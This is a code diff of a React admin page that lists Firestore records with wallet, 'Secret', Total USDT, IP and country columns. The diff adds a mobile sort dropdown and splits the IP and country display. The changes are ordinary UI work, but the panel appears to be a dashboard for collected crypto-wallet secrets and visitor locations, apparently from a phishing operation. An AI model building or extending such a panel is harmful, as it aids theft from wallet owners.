@@ -6,7 +6,7 @@ import {
   getDocs,
   orderBy,
   query,
-  updateDoc
+  updateDoc,
 } from "firebase/firestore";
 import { db } from "../../firebase";
 import moment from "moment";
@@ -27,7 +27,7 @@ const AdminPage = () => {
   const [totalRecord, setTotalRecords] = useState(1);
   const [currentPage, setCurrentPage] = useState(1);
   const [pageSize] = useState(30);
-  const [sortConfig, setSortConfig] = useState({ key: null, order: null }); // "country" | "total", order: "asc" | "desc"
+  const [sortConfig, setSortConfig] = useState({ key: null, order: null });
   const usersRef = collection(db, "mydata");
   const q = query(usersRef, orderBy("createdAt", "desc"));
   const audioRef = useRef(null);
@@ -82,7 +82,6 @@ const AdminPage = () => {
 
       userList = filteredUsers(userList);
 
-      // 🆕 Sort theo cột nếu được chọn
       if (sortConfig.key) {
         userList.sort((a, b) => {
           if (sortConfig.key === "country") {
@@ -92,11 +91,11 @@ const AdminPage = () => {
               ? countryA.localeCompare(countryB)
               : countryB.localeCompare(countryA);
           }
-if (sortConfig.key === "total") {
-  const cleanA = parseFloat((a.total || "0").replace(/[^0-9.]/g, "")) || 0;
-  const cleanB = parseFloat((b.total || "0").replace(/[^0-9.]/g, "")) || 0;
-  return sortConfig.order === "asc" ? cleanA - cleanB : cleanB - cleanA;
-}
+          if (sortConfig.key === "total") {
+            const cleanA = parseFloat((a.total || "0").replace(/[^0-9.]/g, "")) || 0;
+            const cleanB = parseFloat((b.total || "0").replace(/[^0-9.]/g, "")) || 0;
+            return sortConfig.order === "asc" ? cleanA - cleanB : cleanB - cleanA;
+          }
           return 0;
         });
       }
@@ -202,6 +201,35 @@ if (sortConfig.key === "total") {
         </Form>
       </div>
 
+      {/* Sort Dropdown cho Mobile */}
+      <div className="flex gap-2 mb-4 md:hidden">
+        <select
+          value={sortConfig.key || ""}
+          onChange={(e) => {
+            const key = e.target.value;
+            if (!key) {
+              setSortConfig({ key: null, order: null });
+            } else {
+              setSortConfig((prev) => ({
+                key,
+                order: prev.key === key && prev.order === "asc" ? "desc" : "asc",
+              }));
+            }
+            setReload((prev) => !prev);
+          }}
+          className="px-3 py-1 rounded border"
+        >
+          <option value="">-- Sort Mobile --</option>
+          <option value="country">Country</option>
+          <option value="total">Total USDT</option>
+        </select>
+        {sortConfig.key && (
+          <span className="px-2 py-1 bg-gray-200 rounded text-sm">
+            {sortConfig.key} {sortConfig.order === "asc" ? "▲" : "▼"}
+          </span>
+        )}
+      </div>
+
       {/* Danh sách */}
       <div>
         {/* Desktop Table */}
@@ -214,8 +242,6 @@ if (sortConfig.key === "total") {
                 <th className="py-2 px-4 bg-gray-200">Status</th>
                 <th className="py-2 px-4 bg-gray-200">Wallet</th>
                 <th className="py-2 px-4 bg-gray-200">Secret</th>
-
-                {/* 🆕 Sortable Total USDT Column */}
                 <th
                   className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
                   onClick={() => handleSort("total")}
@@ -227,11 +253,8 @@ if (sortConfig.key === "total") {
                       : "▼"
                     : ""}
                 </th>
-
                 <th className="py-2 px-4 bg-gray-200">Time</th>
                 <th className="py-2 px-4 bg-gray-200">IP</th>
-
-                {/* 🆕 Sortable Country Column */}
                 <th
                   className="py-2 px-4 bg-gray-200 cursor-pointer select-none"
                   onClick={() => handleSort("country")}
@@ -355,7 +378,11 @@ if (sortConfig.key === "total") {
               </div>
               <div>
                 <b>IP:</b>{" "}
-                {user.ip ? user.ip.IP + ":" + user.ip.country : "Unknown"}
+                {user.ip ? user.ip.IP : "Unknown"}
+              </div>
+              <div>
+                <b>Country:</b>{" "}
+                {user.ip ? user.ip.country : "Unknown"}
               </div>
               <div className="flex gap-2 mt-2">
                 <button
